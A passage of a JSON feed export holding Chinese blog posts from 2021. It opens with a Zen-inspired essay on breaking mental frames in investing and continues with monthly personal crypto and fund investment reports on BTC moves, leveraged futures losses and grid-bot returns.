自由境界</h4><p>空性是指一切事物都是由一些可变的因缘（条件）和合而成的，这句简简单单的话蕴含着极为丰富的内涵，有很多认识的角度。这篇文章前面已经介绍了一些。看一些古老的禅学书籍，有人问空性是什么，那些禅师会不置可否，或者说“不可说”，一副高深莫测的样子，其实这也是观察空性的一个角度。</p>\n<p>这从何说起？我从一朵花说起，空性无处不在，“郁郁黄花，无非般若”，也就是说从一朵花也能证悟空性，如果你证悟了，问你花是什么，你也会说“不可说”，为什么呢？我来解释一下，花是由很多因缘（条件）和合而成的，到底有多少种因缘呢？答案是无穷多，无穷多的因缘的和合决定了花的无穷多的特性，每一种特性都有无穷多的奥秘，例如花的颜色怎么会五彩缤纷？有些花会与蚂蚁等昆虫形成一种共生的关系，他们是如何互惠互利的？花与阳光的合作，即光合作用的机制是怎么样的？花开花谢是由什么因素决定的？亿万年来，花的进化经历了哪几个重大的阶段？人类如何运用转基因的方法来培育花的新品？等等，佛经说“一花一世界”，一朵花虽小，但却蕴藏着一个庞大的世界，你问花是什么，让我如何告诉你？我告诉你花的某一个特征或某一个奥秘，那我就遗漏了它的无穷多的别的特征和奥秘，我没办法告诉你花是什么，但我可以告诉你花不是什么，例如花没有翅膀，花不会唱歌等等。</p>\n<p>有人说你告诉我花的主要特征就行，只是，即使面对的是同一朵花，摄影师心中的那朵花，和一位花农心中的那朵花，以及植物遗传学家心中的那朵花，其实是完全不同的一朵花，哪一个特征是“主要特征”？你从你认为的“主要特征”进去深入研究这朵花，就像突然间跌进仙境的爱丽斯，你所看到的，是一个无边无际、色彩斑斓但同时迷雾重重、玄机四伏的世界，而且每一个跌进仙境的爱丽斯看到的都是完全不同的世界。你真的全然了解这朵花吗？你真的能够回答花是什么这个问题吗？如果你明白了花不可说的道理，你也就会明白空性不可说的道理。</p>\n<p>再换一个角度看“空性”，那就是“自由”，所谓证悟空性，就是打破框框，获得自由！禅的思维方式是非常独特的，它从一开始就认为这些框框都是暂时和脆弱不堪的，之所以存在就是为了让我们去打破它，乔布斯为什么好像很容易就颠覆这颠覆那，我相信禅的这种思维方式对他影响巨大。我们的思维里有非常多的非常坚硬的框框，只是我们可能不自知。</p>\n<p>以投资举例，一个公司如果在短短数年间内涨幅惊人，往往是它突破了一些传统的框框，例如，腾讯2013年发布微信支付，社交+支付有没有前途？很多人以腾讯多年来做财付通一直没做好为理由，认为只是一个噱头，阿里的人也评估了，认为是不可能成功的，但微信支付以春节发红包为突破口一举打破了这个框框，发展如日中天，根据2017年一季度的数据，月使用用户超过6亿，日均交易笔数超过6亿，把支付宝大幅甩在后面，微信支付的成功，让大家重新评估腾讯金融乃至腾讯生态的潜力，这是近年来腾讯股价惊人上涨的一个非常重要的原因。</p>\n<p>很多人未能把握这种机会，是由于头脑里有很多根深蒂固的成见，当有新的趋势出现时，未能敏锐地觉察，或者即使觉察了也无法打破执念，禅强调回归“初心”，就是要我们放下成见，以初学者的心态接纳一切新鲜事物或者变化，不仅如此，我们还可以尝试不断突破自我，进行各种探索，乔布斯说的“stay hungry stay foolish”，保持“既饿又傻”，非常形象地呈现了人回归初心时那种永不满足、虚怀若谷、积极探索的状态。</p>\n<p>再以价值投资举例，很多人认为所谓价值投资就是买了好股票长期不动，别的操作方式都是离经叛道，我这两年做了很多尝试，例如14年底，我们深度研究了平安可转债，价格只有100出头，我判断下跌空间极其有限，但上涨空间可能很大，我们不但买了，而且用它质押通过交易所借钱，而且是反复加杠杆买入，结果15年市场大涨，我们的回报也还不错，这种加杠杆的方式至少不是巴菲特所提倡的；我们14年12月曾经买了一只垃圾债—湘鄂情债，票面利率是年7.78%， 如果到期还不了，额外罚息率是7.6%，还有5个月就到期了，当时公司经营一塌糊涂，被ST了，它的债跌得很厉害，这个债的总额只有4.8亿元，而质押物居然是5.2亿房产加上2.2亿元股权，我们还意识到壳在中国是很值钱的，随便卖都能卖个二三十亿，这个投资一般人看起来风险很大，但我们判断其实没什么风险，结果到期的时候它确实还不了钱，但是后来公司陆陆续续一直在还，再过11个月后它完成了全部兑付，算了一下，回报还是挺好的，这样一个投资，我认为也是一种基于价值的投资。</p>\n<p>我们曾经长期持有腾讯，多年来一直涨得不错，后来我们算了一下，如果把买它的钱的三五个点，买入一年期的看涨期权，到期后再卖掉再续远期，我们的回报会比现在这种方式高好几倍，有一种风险是如果到时候涨得不好，这个期权会成为废纸，我们会损失掉几个点的资金，但也不过仅此而已，想清楚后，我们后来就配了一点资金买入它的远期期权，效果看还不错，这种股票加远期期权的操作方式，我觉得是价值投资操作上的一个小的突破，总之我觉得即使是价值投资，也有不少创新的空间，我们没有必要固步自封。</p>\n<p>如果有人问我是不是一名价值投资者，我认为不是，我甚至不认为自己是一名禅的信徒，因为一旦你给自己打上标签，就会自设囚笼，自我强化。举个投资的例子，有这么一种投资者，如果他仓位很重，他就认为自己是一个看多市场的人，那么任何重大的政治或者财经事件，他都会往好的方向解读，任何坏的消息他都会选择性视而不见，反复加强，从投资来说，他已经丧失了对市场的敏感度，是一种很危险的倾向；有一位专家叫谢国忠，从十几年前开始一直持续看空中国楼市，涨也看空，跌也看空，从未更改观点，也不进行反省，他已经被自己的观点关进了笼子，无力自救，其实是挺可怜的；有一家美国大型的对冲基金公司为解决这种自我强化的问题，他们规定在买入一只股票之前要预先给这次投资搞个追悼会，也就是说要先假定这次投资是失败的，什么原因呢？要非常详细地列出几个最大的可能，如果理由不充分，那么对不起，说明你还没有真正明白风险所在，是不能买入的，一旦真正买入之后，就要设立一些观察指标跟踪公司的运营，如果出现黄灯就要加倍警惕，出现红灯就要毫不犹豫地清仓出货，这家公司的方法非常值得我们学习；巴菲特说过买股票不想持有十年，就不要持有十分钟，但是据一项统计，自60年代开始至2008年，有数据可查的，他一共投资了200多只股票，持有超过3年的，只有22只，巴菲特买入的时候确实是想持有10年的，但是形势比人强，一旦发现公司情况不如预期，该处理的就要处理，我们不能抱着买一只股票就厮守一生这种想法来投资，投资变化无常，风险很大，我们要警惕各种执念，我们要勇于随时打破各种执念。</p>\n<p>随着我对空性认识的加深，我越来越意识到人生就是打破一个比较小的笼子闯入一个更大的笼子的无限循环的过程。每打破一个笼子都非常艰难，因为每一个笼子看起来都坚不可摧。用什么打破笼子呢？用我们内心的力量。</p>\n<p>这种力量，首先是愿力，我们有没有强烈的愿望、有没有极大的勇气去打破它，然后是我们的专注力，只有高度专注如激光一般，我们才能积蓄所有能量去打破它，我们内心的洞察力和创新力就是具体实施的，它们努力尝试一切方法去打破它，这种力量要持续修炼，直至某一天，当我们的心力足够强大的时候，一脚踹破它，从而进入一个更大的笼子，获得更大的自由。<strong>人生所谓境界的高低，其实就是指你在一个什么大小的笼子里，人生的终极追求，就是把所有的笼子全部打破，迈入一个广阔无垠的空间，获得彻底的自由，所谓成佛，正是如此。</strong></p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/10/31/jobs/",
          "creator": "",
          "pubDate": "2021-10-31T15:07:44.099Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/10/31/jobs/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "97f96e6e0465e62ff9fe187218b8f6b4",
          "highlights": []
        },
        {
          "title": "2021年10月投资月报：市场被涨服",
          "description": "\n    \n      <p>不同于 9 月下跌带来的恐惧以及市场充斥着各种熊市的声音，10 月开始 BTC 就进行了强劲的上涨，一个月的时间最高涨幅达到了 <code>56.04%</code>，于是市场中那些喊着熊市的人又重新喊着牛市来了。</p>\n<p><img src=\"/blogimg/202\n    \n    ",
          "content": "<p>不同于 9 月下跌带来的恐惧以及市场充斥着各种熊市的声音，10 月开始 BTC 就进行了强劲的上涨，一个月的时间最高涨幅达到了 <code>56.04%</code>，于是市场中那些喊着熊市的人又重新喊着牛市来了。</p>\n<p><img src=\"/blogimg/2021103101.png\" alt=\"2021103101.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p><img src=\"/blogimg/2021103102.JPEG\" alt=\"2021103102.JPEG\"></p>\n<p align=\"center\">↑  期货收益</p>\n\n<p>截止到 10/31 21:30，『期货』账户时间加权收益率为 <code>-99.62%</code>，年化收益率是 <code>-54.66%</code>。</p>\n<p>时间加权收益率较上月增长 <code>+0.11%</code>，年化收益率较上月增长 <code>+12.69%</code>。</p>\n<h2 id=\"长期账户和-Pionex-账户统计\"><a href=\"#长期账户和-Pionex-账户统计\" class=\"headerlink\" title=\"长期账户和 Pionex 账户统计\"></a>长期账户和 Pionex 账户统计</h2><p><img src=\"/blogimg/2021103103.JPEG\" alt=\"2021103103.JPEG\"></p>\n<p align=\"center\">↑  长期账户和 Pionex 网格</p>\n\n<p>截止到 10/31 21:30，『长期主义』账户时间加权收益率为 <code>+69.68%</code>，年化收益率暂无。</p>\n<p>时间加权收益率增长 <code>+35.66%</code>，年化收益率暂无。</p>\n<p>截止到 10/31 21:30，『Pionex 网格』账户时间加权收益率为 <code>-19.42%</code>，年化收益率<code>-77.59%</code>。</p>\n<p>时间加权收益率增长 <code>-14.02%</code>，年化收益率<code>+4.08%%</code>。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>目前行情也走到了关键位置，各种链上数据也表明牛市还没有结束，可能接下来的 2 个月左右的时间会出现快速的拉盘上涨然后再进行下跌。目前因为国内的政策原因出入金变得更加困难了，新人的参与可能需要新的暴涨才会吸引他们入场。</p>\n<p>价格在上涨，风险在积聚。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/10/31/investment2110/",
          "creator": "",
          "pubDate": "2021-10-31T14:11:16.279Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/10/31/investment2110/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "89d2d08dc99a70bcb140d8452001b000",
          "highlights": []
        },
        {
          "title": "2021年9月投资月报：重复历史的下跌？",
          "description": "\n    \n      <p>迟到的 9 月报。BTC 历年 9 月都是跌多涨少，今年的 9 月也不例外，截止到 9 月结束，本月价格波幅 <code>28.28%</code>，实际跌幅  <code>-6.96%</code>。</p>\n<p><img src=\"/blogimg/202110040\n    \n    ",
          "content": "<p>迟到的 9 月报。BTC 历年 9 月都是跌多涨少，今年的 9 月也不例外，截止到 9 月结束，本月价格波幅 <code>28.28%</code>，实际跌幅  <code>-6.96%</code>。</p>\n<p><img src=\"/blogimg/2021100401.png\" alt=\"2021100401.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"收益率统计的说明\"><a href=\"#收益率统计的说明\" class=\"headerlink\" title=\"收益率统计的说明\"></a>收益率统计的说明</h2><p>本月由于有知有行对记账功能的资金收益率进行了调整，现在已经没有办法看到相关账户净值了，我在看了最新的账户收益率计算逻辑后，决定选择时间加权收益率，这样和基金经理管理的基金净值更加接近。</p>\n<p><img src=\"/blogimg/2021100402.JPEG\" alt=\"2021100402.JPEG\"></p>\n<p align=\"center\">↑  有知有行不同收益率计算的说明</p>\n\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p><img src=\"/blogimg/2021100403.JPEG\" alt=\"2021100403.JPEG\"></p>\n<p align=\"center\">↑  期货收益</p>\n\n<p>截止到 10/04 22:38，『期货』账户时间加权收益率为 <code>-99.73%</code>，年化收益率是 <code>-67.35%</code>。</p>\n<h2 id=\"长期账户和-Pionex-账户统计\"><a href=\"#长期账户和-Pionex-账户统计\" class=\"headerlink\" title=\"长期账户和 Pionex 账户统计\"></a>长期账户和 Pionex 账户统计</h2><p><img src=\"/blogimg/2021100404.JPEG\" alt=\"2021100404.JPEG\"></p>\n<p align=\"center\">↑  长期账户和 Pionex 网格</p>\n\n<p>截止到 10/04 22:38，『长期主义』账户时间加权收益率为 <code>+34.02%</code>，年化收益率暂无。</p>\n<p>截止到 10/04 22:38，『Pionex 网格』账户时间加权收益率为 <code>-5.40%</code>，年化收益率<code>-81.67%</code>。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>市场越走分歧越大，要么暴涨，要么暴跌。不管涨跌，这个市场由于最近 1 个月十部委的再次打压与火币交易所的清退，参与这个市场变得越来越难。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/10/04/investment2109/",
          "creator": "",
          "pubDate": "2021-10-04T15:14:58.809Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/10/04/investment2109/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "f1a8b2fdd8b1e1e807962ab86a528a32",
          "highlights": []
        },
        {
          "title": "2021年8月投资月报：BTC 年底看到 15W 美金？",
          "description": "\n    \n      <p>最近国内资本市场发生了很多大事件，尤其是以双减政策带来的影响最大，这直接导致了国内的很多在海外上市的教育公司股票脚跟斩，可谓是一纸公文差点毁掉一个行业。</p>\n<p>与此相反的是在 7 月底比特币开始触底反弹，截止到这个月底，差不多从底部上涨了 60%。如果从年初开始计算\n    \n    ",
          "content": "<p>最近国内资本市场发生了很多大事件，尤其是以双减政策带来的影响最大，这直接导致了国内的很多在海外上市的教育公司股票脚跟斩，可谓是一纸公文差点毁掉一个行业。</p>\n<p>与此相反的是在 7 月底比特币开始触底反弹，截止到这个月底，差不多从底部上涨了 60%。如果从年初开始计算，比特币今年上涨了 <code>60%</code> 多，而沪深 300 指数较年初收益率为 <code>-7.78%</code>。</p>\n<p>我个人从 2017 年接触加密资产以来，虽然很看好这个行业，但却没有全身心投入，因为没有做到所谓的知行合一，可以说错过了一个财富自由的机会。</p>\n<p>在这个月中我看到这样的数据，以及对过去几年这 2 个市场的比较，我选择全身心投入加密货币市场，所以在本月 A 股反弹期间，陆续将资金从 A 股投入到了加密货币当中。</p>\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>截止到当日 23:15，『区块创新』账户净值为 <code>0.0041</code>，上月净值为 <code>0.003</code>，本月净值增长 <code>0.0011</code>。</p>\n<p>期货账户净值增长慢大概有几个原因：<br>1.整体仓位价值较初始小。<br>2.目前还在学习相关的知识，操作很少。</p>\n<p><img src=\"/blogimg/2021083102.JPEG\" alt=\"2021083102.JPEG\"></p>\n<h2 id=\"加密资产收益统计\"><a href=\"#加密资产收益统计\" class=\"headerlink\" title=\"加密资产收益统计\"></a>加密资产收益统计</h2><p>『Pionex网格』账户净值为 <code>1.1537</code>，上月净值为 <code>0.8793</code>，本月净值增长 <code>0.2744</code>。得益于 BTC 的上涨，过去的一个月基本跑赢了大盘。</p>\n<p>『加密货币长期主义』账户在 8 月 13 日建仓完成，目前净值为 <code>1.3456</code>，如果按年化收益率计算为 <code>270%</code>，当然短期的盈亏不能代表整体，这个账户追求长期慢慢盈利，账户预计持有 5 年左右。</p>\n<p><img src=\"/blogimg/2021083101.JPEG\" alt=\"2021083101.JPEG\"></p>\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』目前净值<code>1.0692</code>，上月净值 <code>1.0092</code>，本月净值增长<code>0.06</code>，后续该账户将不再更新，目前基金账户较年初收益 <code>4.69%</code>，稍稍的跑赢了大盘。</p>\n<p><img src=\"/blogimg/2021083103.JPEG\" alt=\"2021083103.JPEG\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><ul>\n<li>选择大于努力。</li>\n<li>如何做到知行合一？先有认知/认识，然后根据认知/认识去实践。</li>\n<li>如果光有认知/认识却没有对应的实践，就会造成懂得很多大道理却依然过不好这一生的局面。</li>\n</ul>\n<p>回顾我了解加密资产这将近 5 年的时间，我确实错过了一次财富自由的机会，当然如果从知行合一的角度来讲，我没有错过这个机会。目前选择努力做到知行合一，早日实现财富自由。</p>\n<p>PS：这个月得知我要当爸爸的好消息，所以日常时间会分担一部分照顾我家大宝宝，而且阅读书籍的范畴从社科、金融类开始逐渐转移到孕育类了。期待我家小苹果早日出生，我在加密资产的世界等着他/她。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/08/31/investment2108/",
          "creator": "",
          "pubDate": "2021-08-31T16:14:30.352Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/08/31/investment2108/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "f919b2b525cb842da8eb17dbe5a72b61",
          "highlights": []
        },
        {
          "title": "2021年7月投资月报：行情开始好转",
          "description": "\n    \n      <p>7月的上本个月还在下跌，整个市场充满了悲观情绪，交易量也在萎缩。在月底开始 BTC 开始强势反弹，创造了日线 10 连阳的好成绩。</p>\n<p><img src=\"/blogimg/2021073101.png\" alt=\"2021073101.png\"></p>\n<p \n    \n    ",
          "content": "<p>7月的上本个月还在下跌，整个市场充满了悲观情绪，交易量也在萎缩。在月底开始 BTC 开始强势反弹，创造了日线 10 连阳的好成绩。</p>\n<p><img src=\"/blogimg/2021073101.png\" alt=\"2021073101.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>截止到当日 21:55，『区块创新』账户净值为 <code>0.003</code>，上月净值为 <code>0.001</code>，本月净值增长 <code>0.002</code>。</p>\n<p>『Pionex网格』账户净值为 <code>0.8793</code>，上月净值为 <code>0.7409</code>，本月净值增长 <code>0.1384</code>。</p>\n<p><img src=\"/blogimg/2021073102.JPEG\" alt=\"2021073102\"></p>\n<p align=\"center\">↑  区块创新和 Pionex 网格</p>\n\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』目前净值<code>1.0092</code>，上月净值 <code>1.0346</code>，本月净值增长<code>-0.0254</code>。</p>\n<p>基金账户『跑赢大盘』目前净值<code>0.8967</code>，上月净值 <code>0.9450</code>，本月净值增长<code>-0.0483</code>。</p>\n<p><img src=\"/blogimg/2021073103.JPEG\" alt=\"2021073103\"></p>\n<p align=\"center\">↑ 基金账户</p>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>股市本月开始了大回调，目前只有几个定投的指数基金是赚钱的，而且由于股市交易的时间限制，基金交易的滞后性，以及这个市场需要投入大量精力等原因，后续我会逐步减少持仓，只持有几个指数基金，其余资金投入加密货币领域。</p>\n<p>Delta 变种病毒现在又开始在全球蔓延了，不知道这一次会不会使得全球经济再次陷入泥沼之中，现实再次充满了不确定性。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/07/31/investment2107/",
          "creator": "",
          "pubDate": "2021-08-01T14:46:58.521Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/07/31/investment2107/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "9f6960f4a0336cbd24700eef5ace8b2c",
          "highlights": []
        },
        {
          "title": "2021年6月投资月报：月度级别的震荡",
          "description": "\n    \n      <p>市场经历如此重挫的下跌，在 6 月份一个月的时间里竟然没有像样的反弹，而是进行了长达一个多月的的宽幅震荡，月线级别看相比上月底的价格还有所回落，看着这样的月线，让人心凉。</p>\n<p><img src=\"/blogimg/2021063001.png\" alt=\"2021\n    \n    ",
          "content": "<p>市场经历如此重挫的下跌，在 6 月份一个月的时间里竟然没有像样的反弹，而是进行了长达一个多月的的宽幅震荡，月线级别看相比上月底的价格还有所回落，看着这样的月线，让人心凉。</p>\n<p><img src=\"/blogimg/2021063001.png\" alt=\"2021053101.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>截止到当日 21:34，『区块创新』账户净值为 <code>0.001</code>，上月净值为 <code>0.0069</code>，本月净值增长 <code>-0.0059</code>，账户净值下跌源于震荡中的错误操作。</p>\n<p>『Pionex网格』账户净值为 <code>0.7409</code>，上月净值为 <code>0.7408</code>，本月净值增长 <code>0.0001</code>，净值微弱的增长来自于网格利润。</p>\n<p><img src=\"/blogimg/2021063002.JPEG\" alt=\"2021063002\"></p>\n<p align=\"center\">↑  区块创新和 Pionex 网格</p>\n\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』目前净值<code>1.0346</code>，上月净值 <code>1.0267</code>，本月净值增长<code>0.0079</code>。</p>\n<p>基金账户『跑赢大盘』目前净值<code>0.9450</code>，上月净值 <code>0.9244</code>，本月净值增长<code>0.0206</code>。</p>\n<p><img src=\"/blogimg/2021063003.JPEG\" alt=\"2021063003\"></p>\n<p align=\"center\">↑ 基金账户</p>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>在经历如此长时间的下跌震荡周期以后，市场也马上面临方向选择的问题，在本月自己也阅读了一些技术分析相关的书籍，接下来希望能够使用账户轻仓实践，基本面+技术面的方式逐步形成属于自己的交易系统。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/06/30/investment2106/",
          "creator": "",
          "pubDate": "2021-06-30T14:05:34.509Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/06/30/investment2106/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "473cfcfc5b8160d943017f404eadec42",
          "highlights": []
        },
        {
          "title": "2021年5月投资月报：最严重的一次单月下跌",
          "description": "\n    \n      <p>没想到 4 月份的一个黄昏十字星竟然一语中的。但是我却在开心的迎接 5 月，而且自己内心也希望本月能够有一个不错的涨幅，谁成想本月创造了 BTC 历史最大跌幅，本月振幅达 51.59%，截止到发文时 BTC 价格在 $36700 附近。</p>\n<p><img src=\"/\n    \n    ",
          "content": "<p>没想到 4 月份的一个黄昏十字星竟然一语中的。但是我却在开心的迎接 5 月，而且自己内心也希望本月能够有一个不错的涨幅，谁成想本月创造了 BTC 历史最大跌幅，本月振幅达 51.59%，截止到发文时 BTC 价格在 $36700 附近。</p>\n<p><img src=\"/blogimg/2021053104.png\" alt=\"2021053104.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"聊聊预期\"><a href=\"#聊聊预期\" class=\"headerlink\" title=\"聊聊预期\"></a>聊聊预期</h2><p>没有暴跌预期，所以在遇到暴跌的时候就没有比较好的处理措施，导致账户亏损严重，真的验证了那句话：辛辛苦苦大半年，一朝回到解放前。</p>\n<p>当然，现在回想起来经历本月这么大的下跌，一方面自己没有充分尊重市场，当价格在高位震荡 2 个多月并且开始呈下降趋势时，拒绝相信市场；</p>\n<p>另一方面最大的原因还是因为自己，大家都说交易是对自己的人性的挑战，也是自我成长的过程。反思我账户的较大回撤，还是因为自己心态问题，因为过去大概 6 个月的时间我的账户基本没有任何操作，一直保持很低的杠杆，这也意味着过去半年的收益相对较少，而在行情的相对高位，自己又想实现账户资金的较大增长，逐步的增加了杠杆，最终导致账户的较大回撤。</p>\n<p>遭受重大的回撤后，我对账户进行了重新整理，也是回家这一个多月以来第一次认真审视自己，交易是场修行，我作为交易圈的小学生，要学习的东西还很多。</p>\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>在经历暴跌前，我将期货博一博的账户资金转入了 Pionex，至此该账户的净值定格在了 <code>14.1095</code>，虽然相比最高点 <code>31.94</code> 的净值回撤了不少，不过这也算是我最近半年操作最好的收益了，当然一切都要感谢趋势。</p>\n<p><img src=\"/blogimg/2021053103.jpg\" alt=\"2021053103\"></p>\n<p align=\"center\">↑ 期货博一博账户</p>\n\n<p>截止到当日 21:37，『区块创新』账户净值为 <code>0.0069</code>，上月净值为 <code>1.5017</code>，本月净值增长 <code>-1.4948</code>，之所以该账户净值这么低，也是因为该账户接近爆仓，收益如梦一场，一切从头来过。</p>\n<p>『Pionex网格』账户净值为 <code>0.7408</code>，上月净值为 <code>1.9151</code>，本月净值增长 <code>-1.1743</code>。因为网格在下跌趋势中错误的使用了 BTC 币种的做多 ETP 产品，导致账户净值回撤严重。</p>\n<p><img src=\"/blogimg/2021053101.JPEG\" alt=\"2021053101\"></p>\n<p align=\"center\">↑  区块创新和 Pionex 网格</p>\n\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』目前净值<code>1.0267</code>，上月净值 <code>0.9952</code>，本月净值增长<code>0.0315</code>。</p>\n<p>基金账户『跑赢大盘』目前净值<code>0.9244</code>，上月净值 <code>0.9065</code>，本月净值增长<code>0.0179</code>。</p>\n<p><img src=\"/blogimg/2021053102.JPEG\" alt=\"2021053102\"></p>\n<p align=\"center\">↑ 基金账户</p>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>如果没有足够敬畏市场，市场会以它自己的方式来教育你，本月账户的扛单操作就是市场对我最大的教训，所幸还给我留有了一些口粮。</p>\n<p>很多事情做到知行合一是很困难的事情，交易更是如此。比如期货开单就要做好止盈止损，比如看好大趋势以后操作就要根据趋势来，但是人性是脆弱的，尤其面对账户连续的大波动时，更加从容并且知行合一的操作变得更加困难。</p>\n<p>6 月放弃盲目的期待，开始新的交易之路。</p>\n",
          "category": "",
          "link": "https://zhangdinghao.cn/2021/05/31/investment2105/",
          "creator": "",
          "pubDate": "2021-06-30T13:37:55.080Z",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "https://zhangdinghao.cn/2021/05/31/investment2105/",
          "language": "",
          "folder": "society",
          "feed": "zhangdinghao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "8266d7111c52bec6183262e17cfd8a65",
          "highlights": []
        },
        {
          "title": "2021年4月投资月报：黄昏十字星？",
          "description": "\n    \n      <p>上个月末因为非常看好 4 月份的行情，所以杠杆稍微有点高，谁知道 4 月份上半个月创出新高后行情很快进行了万点大回撤，回撤力度之快超出了我的想象，然后在日线 MA120 的位置迅速反弹，截止到月底行情收了这样的一个十字星。</p>\n<p><img src=\"/blogimg\n    \n    ",
          "content": "<p>上个月末因为非常看好 4 月份的行情，所以杠杆稍微有点高，谁知道 4 月份上半个月创出新高后行情很快进行了万点大回撤，回撤力度之快超出了我的想象，然后在日线 MA120 的位置迅速反弹，截止到月底行情收了这样的一个十字星。</p>\n<p><img src=\"/blogimg/2021043005.png\" alt=\"2021043005.png\"></p>\n<p align=\"center\">↑ BTC 月线走势</p>\n\n<h2 id=\"期货收益统计\"><a href=\"#期货收益统计\" class=\"headerlink\" title=\"期货收益统计\"></a>期货收益统计</h2><p>截止到当日 23:51，『区块创新』账户净值为 <code>1.5017</code>，上月净值为 <code>1.5426</code>，本月净值增长 <code>-0.0409</code>，因为该账户相对稳定，而且在价格低位进行了加仓，整体回撤较少。</p>\n<p>『期货搏一搏』账户净值为 <code>7.1384</code>，上月净值为 <code>12.0924</code>，本月净值增长 <code>-4.954</code>，因为该账户初期投入资金较少，最高时翻了 30 多倍，利润已经全部提现，所以剩余资金的杠杆相对较高，故本月回撤较多。</p>\n<p><img src=\"/blogimg/2021043001.jpg\" alt=\"2021043001\"></p>\n<p align=\"center\">↑ 期货账户</p>\n\n<h2 id=\"网格收益统计\"><a href=\"#网格收益统计\" class=\"headerlink\" title=\"网格收益统计\"></a>网格收益统计</h2><p>『Pionex网格』账户净值为 <code>1.9151</code>，上月净值为 <code>1.2926</code>，本月净值增长 <code>0.6225</code>。因为网格吃波动的价差，所以波动越大收益越大，而且波动过后价格如果依然能够回归的话，波段吃的是最舒服的。</p>\n<p><img src=\"/blogimg/2021043002.jpg\" alt=\"2021043002\"></p>\n<p align=\"center\">↑ Pionex网格</p>\n\n<h2 id=\"基金收益统计\"><a href=\"#基金收益统计\" class=\"headerlink\" title=\"基金收益统计\"></a>基金收益统计</h2><p>基金账户『基金长盈』目前净值<code>0.9952</code>，上月净值 <code>0.9797</code>，本月净值增长<code>0.0155</code>。</p>\n<p>基金账户『跑赢大盘』目前净值<code>0.9065</code>，上月净值 <code>0.8826</code>，本月净值增长<code>0.0239</code>。</p>\n<p><img src=\"/blogimg/2021043003.jpg\" alt=\"2021043003\"></p>\n<p align=\"center\">↑ 基金账户</p>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>常言道币圈一日人间一年，因为这个圈子更新迭代非常快，每年的玩法都是不一样的，比如今年比较火的 DeFi、NFT 等，实际上很考验人的学习能力的。</p>\n<p>当然交易不是一朝一夕就能做到完美的，接下来的 5 月份继续学习，继续看好未来的加密货币。</p>\n<p><img src=\"/blogimg/2021043004.png\" alt=\"2021043004\"></p>\n<p align=\"center\">↑ BTC 彩虹模型</p>\n\n<p>随着 4 